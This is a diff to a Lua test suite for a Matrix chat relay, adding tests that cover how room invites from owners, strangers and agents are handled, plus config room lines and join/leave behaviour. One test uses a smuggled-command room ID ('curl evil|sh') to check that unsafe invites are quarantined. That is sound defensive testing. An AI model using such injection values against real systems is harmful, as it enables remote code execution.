@@ -17,6 +17,10 @@ dofile("packages/butler/matrix_cli.lua")
 local setup_tests = dofile("tests/butler_matrix_setup.lua")
 local relay_module = dofile("packages/butler/matrix_relay.lua")
 
+local function remove_dir(dir)
+  os.execute("rm -rf " .. string.format("%q", dir))
+end
+
 local function fixture()
   local dir = os.tmpname()
   os.remove(dir)
@@ -141,7 +145,7 @@ local function test_baseline_resume_filters_and_envelope()
     "missing or invalid event time must fall back to UTC")
 
   relay:stop()
-  os.execute("rm -rf " .. string.format("%q", dir))
+  remove_dir(dir)
 end
 
 local function test_allowlisted_media_types_and_sender_filter()
@@ -330,7 +334,7 @@ local function test_state_restart_corruption_and_processed_cap()
     "a crash-window backup should be restored before polling")
   recovered_file:close()
   recovered:stop()
-  os.execute("rm -rf " .. string.format("%q", dir))
+  remove_dir(dir)
 end
 
 local function test_pending_delivery_retries_safely_after_restart()
@@ -368,7 +372,7 @@ local function test_pending_delivery_retries_safely_after_restart()
   } } } })
   assert(successes == 1, "acknowledged event must not be delivered a second time")
   restarted:stop()
-  os.execute("rm -rf " .. string.format("%q", dir))
+  remove_dir(dir)
 end
 
 local function test_ack_reconcile_and_utf8_body_cap()
@@ -420,7 +424,7 @@ local function test_ack_reconcile_and_utf8_body_cap()
   local prefix = body:match("^(.*)%[truncated")
   assert(prefix:byte(-1) ~= nil and prefix:byte(-1) < 0x80,
     "UTF-8 truncation must not end on a partial multibyte sequence")
-  os.execute("rm -rf " .. string.format("%q", dir))
+  remove_dir(dir)
 end
 
 local function test_messages_backfill_baseline_and_retry_backoff()
@@ -454,7 +458,7 @@ local function test_messages_backfill_baseline_and_retry_backoff()
   client:complete(3, { error = "offline" })
   assert(#remuda._relay_timers > 0, "transport errors schedule a retry")
   relay:stop()
-  os.execute("rm -rf " .. string.format("%q", dir))
+  remove_dir(dir)
 end
 
 local function test_retry_backoff_grows_and_resets_after_recovery()
@@ -477,7 +481,7 @@ local function test_retry_backoff_grows_and_resets_after_recovery()
   tick_timers(1)
   assert(#client.requests == 10, "success resets the next retry to one second")
   relay:stop()
-  os.execute("rm -rf " .. string.format("%q", dir))
+  remove_dir(dir)
 end
 
 local function test_allowlist_refusal_is_logged_once()
@@ -500,7 +504,7 @@ local function test_allowlist_refusal_is_logged_once()
   assert(calls == 2, "refusal retry fixture did not exercise a repeated request")
   assert(refusals == 1, "a persistent allowlist refusal must log once per relay lifetime")
   relay:stop()
-  os.execute("rm -rf " .. string.format("%q", dir))
+  remove_dir(dir)
 end
 
 local function test_thread_root_mail_references_are_stable()
@@ -630,6 +634,583 @@ local function test_redefined_public_words_do_not_change_trust()
   assert(sent.matrix_route.from_agent == true,
     "a redefined is_agent_mxid reclassified an agent sender in mail reply")
   matrix.read_config, matrix.is_agent_mxid = saved_read, saved_agent
+end
+
+
+-- Owner room invites (notes/invite-design.md). The config file is the one
+-- room boundary: an accepted invite appends `room=ID how=...` to it.
+local HOME, ALL, NEW = "!room:example.org", "!all:example.org", "!new:example.org"
+local OWNER, STRANGER = "@alice:example.org", "@mallory:example.org"
+
+local function invite_fixture(senders, extra)
+  local dir, path = fixture()
+  local file = assert(io.open(path, "w"))
+  file:write("http://matrix.invalid\n", HOME, "\n@bot:example.org\n", senders or OWNER,
+    "\nfalse\n30000\nall_room=", ALL, "\n", extra or "")
+  file:close()
+  return dir, path
+end
+
+local function read_text(path)
+  local file = assert(io.open(path, "rb"))
+  local text = file:read("a")
+  file:close()
+  return text
+end
+
+local function room_line(path, room)
+  for line in read_text(path):gmatch("[^\n]+") do
+    if line:match("^room=(%S+)") == room then return line end
+  end
+end
+
+local function test_config_add_room_pads_short_config()
+  local dir, path = fixture()
+  local file = assert(io.open(path, "w"))
+  file:write("http://matrix.invalid\n", HOME, "\n@bot:example.org\n")
+  file:close()
+  local ok, added = matrix.config_add_room(path, NEW, "operator")
+  local passed, err = pcall(function()
+    assert(ok, "adding a room to a short config must succeed")
+    local conf = assert(matrix.read_config(path))
+    assert(conf.use_messages == false and conf.timeout_ms == 30000 and not conf.allowed_senders[OWNER],
+      "padding a short config must preserve the defaults for missing mode, timeout, and allowed senders")
+    assert(conf.rooms[NEW] == "joined", "the room added to a short config must remain configured")
+    local lines = {}
+    for line in (read_text(path) .. "\n"):gmatch("([^\n]*)\n") do lines[#lines + 1] = line end
+    assert(lines[4] == "" and lines[5] == "" and lines[6] == "" and lines[7]:match("^room=" .. NEW),
+      "room= must follow the sixth positional config line")
+    assert(added == true, "adding a room to a short config must report that it wrote the line")
+  end)
+  remove_dir(dir)
+  assert(passed, err)
+end
+
+local function encoded(room)
+  return (room:gsub("([^%w%-%._~])", function(c) return string.format("%%%02X", c:byte()) end))
+end
+
+-- Scripted client that also records the L2 send/reply words, so the tests do
+-- not dictate which word the relay uses for its notices.
+local function invite_client()
+  local client = scripted_client()
+  local function record(opts, callback)
+    return client.request_json({ method = "PUT", room = opts.room, text = opts.text,
+      path = "/_matrix/client/v3/rooms/" .. encoded(opts.room) .. "/send/m.room.message/w" }, callback)
+  end
+  client.send, client.reply = record, record
+  function client:sync(value)
+    for index = #self.requests, 1, -1 do
+      if self.requests[index].path:find("/sync", 1, true) and self.callbacks[index] then
+        return self:complete(index, value)
+      end
+    end
+    error("no pending /sync request")
+  end
+  -- Answer every pending non-sync request; join_result overrides the join reply.
+  function client:pump(join_result)
+    local progressed = true
+    while progressed do
+      progressed = false
+      for index, args in ipairs(self.requests) do
+        if self.callbacks[index] and not args.path:find("/sync", 1, true) then
+          progressed = true
+          if args.path:find("/join", 1, true) then
+            self:complete(index, join_result or { json = { room_id = NEW } })
+          else
+            self:complete(index, { json = { event_id = "$sent" .. index } })
+          end
+        end
+      end
+    end
+  end
+  function client:joins(room)
+    local n = 0
+    for _, args in ipairs(self.requests) do
+      if args.method == "POST" and args.path == "/_matrix/client/v3/rooms/" .. encoded(room) .. "/join" then
+        n = n + 1
+      end
+    end
+    return n
+  end
+  function client:messages(room, text)
+    local n = 0
+    for _, args in ipairs(self.requests) do
+      local body = args.text or args.body or ""
+      if args.method == "PUT" and (args.room == room or args.path:find("/rooms/" .. encoded(room) .. "/", 1, true))
+        and body:find(text, 1, true) then n = n + 1 end
+    end
+    return n
+  end
+  return client
+end
+
+local function invite(room, inviter)
+  return { [room] = { invite_state = { events = {
+    { type = "m.room.name", sender = inviter, state_key = "", content = { name = "x" } },
+    { type = "m.room.member", sender = inviter, state_key = "@bot:example.org",
+      content = { membership = "invite" } },
+  } } } }
+end
+
+local function started_relay(path, client, delivered)
+  local relay = relay_module.new({ config_path = path, matrix = client,
+    deliver = function(event) delivered[#delivered + 1] = event return true end })
+  assert(relay:start())
+  client:sync({ json = { next_batch = "s0" } })
+  return relay
+end
+
+local function owner_message(room, id)
+  return { [room] = { timeline = { events = {
+    { type = "m.room.message", event_id = id, sender = OWNER,
+      content = { msgtype = "m.text", body = "hello from " .. room } },
+  } } } }
+end
+
+local function delivered_ids(delivered, id)
+  for _, event in ipairs(delivered) do if event.event_id == id then return true end end
+  return false
+end
+
+local function test_owner_invite_joins_writes_line_and_notices_once()
+  local dir, path = invite_fixture()
+  local client, delivered = invite_client(), {}
+  local relay = started_relay(path, client, delivered)
+  client:sync({ json = { next_batch = "s1", rooms = { invite = invite(NEW, OWNER) } } })
+  client:pump()
+  assert(client:joins(NEW) == 1, "an owner invite must POST join exactly once")
+  local line = room_line(path, NEW)
+  assert(line and line:find("how=owner-invite", 1, true),
+    "an owner invite must append 'room=" .. NEW .. " how=owner-invite' to the config")
+  local notice = "Joined; I read messages here from the owner."
+  assert(client:messages(NEW, notice) == 1, "the joined room must get the notice once")
+  client:sync({ json = { next_batch = "s2", rooms = { invite = invite(NEW, OWNER) } } })
+  client:pump()
+  assert(client:joins(NEW) == 2 and client:messages(NEW, notice) == 1,
+    "a repeated owner invite for a configured room must retry join without repeating the notice")
+  client:sync({ json = { next_batch = "s3", rooms = { join = owner_message(NEW, "$in-new") } } })
+  assert(delivered_ids(delivered, "$in-new"),
+    "a later owner message in the joined room must become mail (HOME rules)")
+  relay:stop()
+  remove_dir(dir)
+end
+
+local function test_configured_joined_room_owner_invite_retries_without_config_or_notice()
+  local original = "room=" .. NEW .. " how=operator\n"
+  local dir, path = invite_fixture(nil, original)
+  local before = read_text(path)
+  local client, delivered = invite_client(), {}
+  local relay = started_relay(path, client, delivered)
+  local ok, err = pcall(function()
+    client:sync({ json = { next_batch = "s1", rooms = { invite = invite(NEW, OWNER) } } })
+    client:sync({ json = { next_batch = "s2", rooms = { invite = invite(NEW, OWNER) } } })
+    assert(client:joins(NEW) == 1, "repeated syncs must not stack owner invite joins")
+    client:pump()
+    assert(client:joins(NEW) == 1, "an owner invite for a configured joined room must retry POST join")
+    assert(read_text(path) == before, "retrying a configured room must not rewrite its config line")
+    assert(client:messages(NEW, "Joined;") == 0, "retrying a configured room must not repeat Joined notice")
+    local special_invites = {}
+    for _, room in ipairs({ HOME, ALL }) do
+      for room_id, invitation in pairs(invite(room, OWNER)) do special_invites[room_id] = invitation end
+    end
+    client:sync({ json = { next_batch = "s3", rooms = { invite = special_invites } } })
+    client:pump()
+    assert(client:joins(HOME) == 0 and client:joins(ALL) == 0,
+      "HOME and ALL invites must be ignored")
+    assert(read_text(path) == before and client:messages(HOME, "Invite to") == 0,
+      "HOME and ALL invites must not change config or produce quarantine notices")
+  end)
+  relay:stop()
+  remove_dir(dir)
+  assert(ok, err)
+end
+
+local function test_owner_invite_in_baseline_sync_joins_and_writes_line()
+  local dir, path = invite_fixture()
+  local before = read_text(path)
+  local client, delivered = invite_client(), {}
+  local relay = relay_module.new({ config_path = path, matrix = client,
+    deliver = function(event) delivered[#delivered + 1] = event return true end })
+  assert(relay:start())
+  local ok, err = pcall(function()
+    client:sync({ json = { next_batch = "s0", rooms = { invite = invite(NEW, OWNER) } } })
+    client:pump()
+    assert(client:joins(NEW) == 1, "an owner invite in the baseline sync must POST join")
+    local line = room_line(path, NEW)
+    assert(line and line:find("how=owner-invite", 1, true),
+      "an owner invite in the baseline sync must write the owner-invite room line")
+    assert(read_text(path) ~= before, "an owner invite in the baseline sync must update config")
+  end)
+  relay:stop()
+  remove_dir(dir)
+  assert(ok, err)
+end
+
+local function test_owner_invite_failure_preserves_concurrent_room_line()
+  local dir, path = invite_fixture()
+  local client, delivered = invite_client(), {}
+  local relay = started_relay(path, client, delivered)
+  local config_add_room = matrix.config_add_room
+  local injected = false
+  matrix.config_add_room = function(config_path, room, how)
+    if config_path == path and room == NEW and not injected then
+      injected = true
+      local ok, err = config_add_room(config_path, room, "operator")
+      assert(ok, "could not write the concurrent operator room line: " .. tostring(err))
+    end
+    return config_add_room(config_path, room, how)
+  end
+  local ok, err = pcall(function()
+    client:sync({ json = { next_batch = "s1", rooms = { invite = invite(NEW, OWNER) } } })
+    client:pump({ error = "M_FORBIDDEN" })
+    local line = room_line(path, NEW)
+    assert(injected and client:joins(NEW) == 1, "the invite must try joining after the concurrent config write")
+    assert(line and line:find("how=operator", 1, true),
+      "a failed owner invite must preserve an operator room line written after the relay cached config")
+  end)
+  matrix.config_add_room = config_add_room
+  relay:stop()
+  remove_dir(dir)
+  assert(ok, err)
+end
+
+local function test_stranger_invite_is_quarantined_with_home_next()
+  local dir, path = invite_fixture()
+  local before = read_text(path)
+  local client, delivered = invite_client(), {}
+  local relay = started_relay(path, client, delivered)
+  client:sync({ json = { next_batch = "s1", rooms = { invite = invite(NEW, STRANGER) } } })
+  client:pump()
+  assert(client:joins(NEW) == 0, "a stranger invite must never be joined")
+  assert(read_text(path) == before, "a stranger invite must not change the config")
+  local item
+  for _, q in ipairs(relay:quarantine_list()) do
+    if q.reason == "invite_not_allowlisted" then item = q end
+  end
+  assert(item, "a stranger invite must be quarantined as invite_not_allowlisted")
+  assert(item.sender == STRANGER and item.room_id == NEW,
+    "the quarantine record must name the inviter and the invited room")
+  local line = "Invite to " .. NEW .. " from " .. STRANGER
+    .. " was not accepted. Next: remuda butler matrix join '" .. NEW .. "'"
+  assert(client:messages(HOME, line) == 1, "HOME must get one line with the Next command")
+  client:sync({ json = { next_batch = "s2", rooms = { invite = invite(NEW, STRANGER) } } })
+  client:pump()
+  assert(client:joins(NEW) == 0 and client:messages(HOME, line) == 1,
+    "a repeated stranger invite must not join or repeat the HOME line")
+  relay:stop()
+  remove_dir(dir)
+end
+
+local function test_conflicting_inviter_events_cannot_join()
+  local dir, path = invite_fixture()
+  local before = read_text(path)
+  local client, delivered = invite_client(), {}
+  local relay = started_relay(path, client, delivered)
+  local invitation = { [NEW] = { invite_state = { events = {
+    { type = "m.room.member", sender = OWNER, state_key = "@bot:example.org",
+      content = { membership = "invite" } },
+    { type = "m.room.member", sender = STRANGER, state_key = "@bot:example.org",
+      content = { membership = "invite" } },
+  } } } }
+  local ok, err = pcall(function()
+    client:sync({ json = { next_batch = "s1", rooms = { invite = invitation } } })
+    client:pump()
+    assert(client:joins(NEW) == 0, "conflicting invite senders must never be joined")
+    assert(read_text(path) == before, "conflicting invite senders must not change the config")
+    local item
+    for _, q in ipairs(relay:quarantine_list()) do
+      if q.reason == "invite_not_allowlisted" then item = q end
+    end
+    assert(item and item.sender == STRANGER and item.room_id == NEW,
+      "the conflicting invite must be quarantined with the real stranger and room")
+  end)
+  relay:stop()
+  remove_dir(dir)
+  assert(ok, err)
+end
+
+local function test_unsafe_invite_room_is_quarantined_without_home_notice()
+  local dir, path = invite_fixture()
+  local before = read_text(path)
+  local hostile_room = "!x:evil.org'; curl evil|sh; '"
+  local client, delivered = invite_client(), {}
+  local relay = started_relay(path, client, delivered)
+  local invitation = { [hostile_room] = { invite_state = { events = {
+    { type = "m.room.member", sender = STRANGER, state_key = "@bot:example.org",
+      content = { membership = "invite" } },
+  } } } }
+  local ok, err = pcall(function()
+    client:sync({ json = { next_batch = "s1", rooms = { invite = invitation } } })
+    client:pump()
+    assert(client:joins(hostile_room) == 0, "an unsafe room ID must never be joined")
+    assert(read_text(path) == before, "an unsafe room ID must not change the config")
+    local item
+    for _, q in ipairs(relay:quarantine_list()) do
+      if q.reason == "invite_not_allowlisted" then item = q end
+    end
+    assert(item and item.room_id == hostile_room, "the unsafe invite must still be quarantined")
+    assert(client:messages(HOME, "Invite to") == 0, "an unsafe room ID must not appear in a HOME command")
+  end)
+  relay:stop()
+  remove_dir(dir)
+  assert(ok, err)
+end
+
+local function test_bidi_invite_room_is_quarantined_without_home_notice()
+  local dir, path = invite_fixture()
+  local bidi_room = "!room\226\128\174:example.org"
+  local client, delivered = invite_client(), {}
+  local relay = started_relay(path, client, delivered)
+  local ok, err = pcall(function()
+    client:sync({ json = { next_batch = "s1", rooms = { invite = invite(bidi_room, STRANGER) } } })
+    client:pump()
+    local item
+    for _, q in ipairs(relay:quarantine_list()) do
+      if q.reason == "invite_not_allowlisted" and q.room_id == bidi_room then item = q end
+    end
+    assert(item and item.sender == STRANGER, "a bidi room invite must still be quarantined")
+    assert(client:messages(HOME, "Invite to") == 0,
+      "a bidi room ID must not appear in a HOME invite notice")
+  end)
+  relay:stop()
+  remove_dir(dir)
+  assert(ok, err)
+end
+
+local function test_long_invite_identifiers_dedupe_home_notice()
+  local dir, path = invite_fixture()
+  local long_room = "!" .. string.rep("r", 298) .. ":" .. string.rep("s", 300)
+  local long_inviter = "@" .. string.rep("u", 298) .. ":" .. string.rep("x", 300)
+  local saved_ulid, ulid_count = remuda._butler_new_ulid, 0
+  remuda._butler_new_ulid = function()
+    ulid_count = ulid_count + 1
+    return string.format("01LONGTEST%05d", ulid_count)
+  end
+  local client, delivered = invite_client(), {}
+  local relay = started_relay(path, client, delivered)
+  local invitation = invite(long_room, long_inviter)
+  local ok, err = pcall(function()
+    client:sync({ json = { next_batch = "s1", rooms = { invite = invitation } } })
+    client:pump()
+    client:sync({ json = { next_batch = "s2", rooms = { invite = invitation } } })
+    client:pump()
+    assert(client:messages(HOME, "Invite to") == 1,
+      "repeated long room/inviter IDs must produce only one HOME notice")
+    assert(#relay:quarantine_list() == 1,
+      "repeated long room/inviter IDs must dedupe to one quarantine record")
+  end)
+  relay:stop()
+  remuda._butler_new_ulid = saved_ulid
+  remove_dir(dir)
+  assert(ok, err)
+end
+
+local function test_invite_home_notice_cap_adds_one_summary()
+  local dir, path = invite_fixture()
+  local client, delivered = invite_client(), {}
+  local relay = started_relay(path, client, delivered)
+  local invites = {}
+  for index = 1, 5 do
+    local room = "!bulk" .. tostring(index) .. ":example.org"
+    invites[room] = invite(room, STRANGER)[room]
+  end
+  local ok, err = pcall(function()
+    client:sync({ json = { next_batch = "s1", rooms = { invite = invites } } })
+    client:pump()
+    assert(client:messages(HOME, "Invite to") == 3,
+      "only three individual HOME invite notices may be sent in one sync")
+    assert(client:messages(HOME, "2 more invites quarantined. Next: remuda butler matrix quarantine") == 1,
+      "remaining HOME invite notices must be summarized once")
+    assert(#relay:quarantine_list() == 5, "all stranger invites must still be quarantined")
+  end)
+  relay:stop()
+  remove_dir(dir)
+  assert(ok, err)
+end
+
+local function test_agent_invite_is_not_joined()
+  local agents = { "@agent-x:example.org", "@butler-x:example.org" }
+  local dir, path = invite_fixture(OWNER .. "," .. table.concat(agents, ","))
+  local before = read_text(path)
+  local client, delivered = invite_client(), {}
+  local relay = started_relay(path, client, delivered)
+  for i, agent in ipairs(agents) do
+    local room = "!agent" .. i .. ":example.org"
+    client:sync({ json = { next_batch = "s" .. i, rooms = { invite = invite(room, agent) } } })
+    client:pump()
+    assert(client:joins(room) == 0, "an agent-MXID invite must not be joined: " .. agent)
+  end
+  assert(read_text(path) == before, "an agent invite must not change the config")
+  relay:stop()
+  remove_dir(dir)
+end
+
+local function http_fake(status, calls)
+  return { request = function(spec)
+    calls[#calls + 1] = spec
+    spec.callback({ status = status, headers = {}, body = status == 200 and "{}" or
+      '{"errcode":"M_FORBIDDEN","error":"no"}' })
+    return { cancel = function() end }
+  end }
+end
+
+local function with_operator_config(path, status, run)
+  dofile("packages/butler/matrix_request.lua") -- fresh rate-limit bucket
+  remuda._butler_new_ulid = remuda._butler_new_ulid or function() return "01TESTULID" end
+  dofile("packages/butler/matrix_write.lua")
+  local token = path .. ".token"
+  local file = assert(io.open(token, "w")); file:write("access-token"); file:close()
+  local saved_http, saved_conf = remuda.http, remuda._butler_matrix_config
+  local calls = {}
+  remuda.http = http_fake(status, calls)
+  remuda._butler_matrix_config = { token_path = token, config_path = path }
+  remuda._butler_matrix_paths = remuda._butler_matrix_config
+  local ok, err = pcall(run, calls)
+  remuda.http, remuda._butler_matrix_config, remuda._butler_matrix_paths = saved_http, saved_conf, nil
+  if not ok then error(err, 0) end
+end
+
+local function test_join_failure_rolls_back_room_line()
+  local dir, path = invite_fixture()
+  local before = read_text(path)
+  local client, delivered = invite_client(), {}
+  local relay = started_relay(path, client, delivered)
+  client:sync({ json = { next_batch = "s1", rooms = { invite = invite(NEW, OWNER) } } })
+  client:pump({ error = "M_FORBIDDEN" })
+  assert(client:joins(NEW) == 1, "the owner invite must attempt the join")
+  assert(read_text(path) == before, "a failed relay join must remove the room line again")
+  assert(client:messages(NEW, "Joined;") == 0, "a failed join must not post the Joined notice")
+  relay:stop()
+
+  with_operator_config(path, 403, function(calls)
+    local result
+    matrix.join({ room = NEW }, function(value) result = value end)
+    assert(#calls == 1 and calls[1].method == "POST" and calls[1].url:find("/join", 1, true),
+      "matrix join must POST join for a new room (the room line allows it)")
+    assert(result and result.error, "a failed operator join must report the error")
+    assert(result.error:find("Next: invite the bot (@bot:example.org) to " .. NEW
+      .. " from Element, then retry.", 1, true), "a forbidden join must explain how to invite the bot")
+    assert(read_text(path) == before, "a failed operator join must remove the room line again")
+  end)
+  with_operator_config(path, 200, function()
+    local result
+    matrix.join({ room = NEW }, function(value) result = value end)
+    assert(result and not result.error, "operator join failed: " .. tostring(result and result.error))
+    local line = room_line(path, NEW)
+    assert(line and line:find("how=operator", 1, true), "matrix join must append how=operator")
+  end)
+  local added_ok, was_added = matrix.config_add_room(path, NEW, "operator")
+  assert(added_ok and was_added == false, "an existing room line must report added=false")
+  local existing_text = read_text(path)
+  with_operator_config(path, 403, function(calls)
+    local result
+    matrix.join({ room = NEW }, function(value) result = value end)
+    assert(result and result.error and #calls == 1, "an existing configured room must still attempt join")
+    assert(read_text(path) == existing_text,
+      "a failed join for an already configured room must retain its room line")
+  end)
+  remove_dir(dir)
+end
+
+local function test_joined_room_survives_restart()
+  local dir, path = invite_fixture(nil, "room=" .. NEW .. " how=owner-invite\n")
+  local client, delivered = invite_client(), {}
+  local relay = started_relay(path, client, delivered)
+  client:sync({ json = { next_batch = "s1", rooms = { join = owner_message(NEW, "$after-restart") } } })
+  assert(delivered_ids(delivered, "$after-restart"),
+    "a relay started on a config with the room line must listen in that room")
+  relay:stop()
+  remove_dir(dir)
+end
+
+local function test_running_relay_picks_up_operator_join_from_config()
+  local dir, path = invite_fixture()
+  local client, delivered = invite_client(), {}
+  local relay = started_relay(path, client, delivered)
+  assert(matrix.config_add_room(path, NEW, "operator"), "could not add operator room config line")
+  client:sync({ json = { next_batch = "s1", rooms = { join = owner_message(NEW, "$operator-joined") } } })
+  assert(delivered_ids(delivered, "$operator-joined"),
+    "a running relay must listen in a room added to config without restarting")
+  relay:stop()
+  remove_dir(dir)
+end
+
+local function test_leave_removes_room_home_and_all_refused()
+  local dir, path = invite_fixture(nil, "room=" .. NEW .. " how=operator\n")
+  with_operator_config(path, 200, function(calls)
+    for _, room in ipairs({ HOME, ALL }) do
+      local before, result = read_text(path), nil
+      matrix.leave({ room = room }, function(value) result = value end)
+      assert(result and result.error and result.error:find("can't be left", 1, true)
+        and result.error:find("HOME and ALL rooms can't be left.\nNext: remuda butler matrix setup (to change HOME or ALL)", 1, true),
+        "leaving HOME/ALL must be refused: " .. room)
+      assert(#calls == 0 and read_text(path) == before, "a refused leave must not call or edit")
+    end
+    local result
+    matrix.leave({ room = NEW }, function(value) result = value end)
+    assert(result and not result.error, "leave of a joined room failed: " .. tostring(result and result.error))
+    assert(#calls == 1 and calls[1].url:find("/rooms/" .. encoded(NEW) .. "/leave", 1, true),
+      "leave must POST leave for the joined room")
+    assert(room_line(path, NEW) == nil, "leave must remove the room line")
+    assert(read_text(path):find("all_room=" .. ALL, 1, true), "leave must keep the other config lines")
+  end)
+  remove_dir(dir)
+end
+
+local function test_leave_unconfigured_room_is_refused()
+  local dir, path = invite_fixture()
+  with_operator_config(path, 200, function(calls)
+    local result
+    matrix.leave({ room = NEW }, function(value) result = value end)
+    assert(result and result.error == NEW .. " is not a configured Matrix room.",
+      "leaving an unconfigured room must explain that it is not configured")
+    assert(#calls == 0, "leaving an unconfigured room must not make an HTTP request")
+  end)
+  remove_dir(dir)
+end
+
+local function test_failed_leave_reports_removed_config_and_safe_next()
+  local dir, path = invite_fixture(nil, "room=" .. NEW .. " how=operator\n")
+  with_operator_config(path, 403, function(calls)
+    local result
+    matrix.leave({ room = NEW }, function(value) result = value end)
+    assert(result and result.error and result.error:find("the room was removed from the local config", 1, true),
+      "a failed leave must say the room was removed from the local config")
+    local _, next_count = result.error:gsub("Next:", "")
+    assert(next_count == 1, "a failed leave must contain exactly one Next hint")
+    assert(not result.error:find("password", 1, true), "a failed leave must not retain the HTTP password hint")
+    assert(result.error:find("Next: remuda butler matrix rooms", 1, true),
+      "a failed leave must direct the operator to matrix rooms")
+    assert(#calls == 1 and room_line(path, NEW) == nil,
+      "a failed leave must POST and remove the configured room line")
+  end)
+  remove_dir(dir)
+end
+
+local function test_unconfigured_room_request_is_refused()
+  local dir, path = invite_fixture(nil, "room=" .. NEW .. " how=operator\n")
+  with_operator_config(path, 200, function(calls)
+    local other = "!other:example.org"
+    local results = {}
+    local collect = function(value) results[#results + 1] = value end
+    matrix.request_json({ method = "GET",
+      path = "/_matrix/client/v3/rooms/" .. encoded(other) .. "/state" }, collect)
+    matrix.request_json({ method = "GET", path = "/_matrix/client/v3/account/whoami", room = other }, collect)
+    matrix.same_room(other, "$event", collect)
+    assert(#results == 3 and #calls == 0, "unconfigured-room requests must be refused before HTTP")
+    for _, r in ipairs(results) do
+      assert(r.error and r.error:find("outside the configured Matrix allowlist", 1, true),
+        "unconfigured-room refusal changed: " .. tostring(r.error))
+    end
+    local joined
+    matrix.request_json({ method = "GET",
+      path = "/_matrix/client/v3/rooms/" .. encoded(NEW) .. "/state", room = NEW },
+      function(value) joined = value end)
+    assert(joined and not joined.error and #calls == 1,
+      "a room= line must admit that room to request_json: " .. tostring(joined and joined.error))
+  end)
+  remove_dir(dir)
 end
 
 local function assert_fixture_text(name, actual)
@@ -873,3 +1454,32 @@ for _, test in ipairs({ test_thread_first_fixtures, test_thread_reply_fixture,
 end
 assert(#fixture_failures == 0, "rendered mail fixture failures:\n" .. table.concat(fixture_failures, "\n"))
 print("ok: Matrix relay resume, exactly-once, filters, state, acks, caps, fallback, and backoff")
+
+-- Invite tests run last and report every failure before failing the suite.
+local invite_failures = {}
+for _, case in ipairs({
+  { "test_owner_invite_joins_writes_line_and_notices_once", test_owner_invite_joins_writes_line_and_notices_once },
+  { "test_configured_joined_room_owner_invite_retries_without_config_or_notice", test_configured_joined_room_owner_invite_retries_without_config_or_notice },
+  { "test_owner_invite_in_baseline_sync_joins_and_writes_line", test_owner_invite_in_baseline_sync_joins_and_writes_line },
+  { "test_owner_invite_failure_preserves_concurrent_room_line", test_owner_invite_failure_preserves_concurrent_room_line },
+  { "test_stranger_invite_is_quarantined_with_home_next", test_stranger_invite_is_quarantined_with_home_next },
+  { "test_conflicting_inviter_events_cannot_join", test_conflicting_inviter_events_cannot_join },
+  { "test_unsafe_invite_room_is_quarantined_without_home_notice", test_unsafe_invite_room_is_quarantined_without_home_notice },
+  { "test_bidi_invite_room_is_quarantined_without_home_notice", test_bidi_invite_room_is_quarantined_without_home_notice },
+  { "test_long_invite_identifiers_dedupe_home_notice", test_long_invite_identifiers_dedupe_home_notice },
+  { "test_invite_home_notice_cap_adds_one_summary", test_invite_home_notice_cap_adds_one_summary },
+  { "test_agent_invite_is_not_joined", test_agent_invite_is_not_joined },
+  { "test_config_add_room_pads_short_config", test_config_add_room_pads_short_config },
+  { "test_join_failure_rolls_back_room_line", test_join_failure_rolls_back_room_line },
+  { "test_joined_room_survives_restart", test_joined_room_survives_restart },
+  { "test_running_relay_picks_up_operator_join_from_config", test_running_relay_picks_up_operator_join_from_config },
+  { "test_leave_removes_room_home_and_all_refused", test_leave_removes_room_home_and_all_refused },
+  { "test_leave_unconfigured_room_is_refused", test_leave_unconfigured_room_is_refused },
+  { "test_failed_leave_reports_removed_config_and_safe_next", test_failed_leave_reports_removed_config_and_safe_next },
+  { "test_unconfigured_room_request_is_refused", test_unconfigured_room_request_is_refused },
+}) do
+  local ok, err = pcall(case[2])
+  if not ok then invite_failures[#invite_failures + 1] = case[1] .. ": " .. tostring(err) end
+end
+assert(#invite_failures == 0, "invite tests failed:\n" .. table.concat(invite_failures, "\n"))
+print("ok: Matrix owner invites, room lines, join/leave, and the one room allowlist")
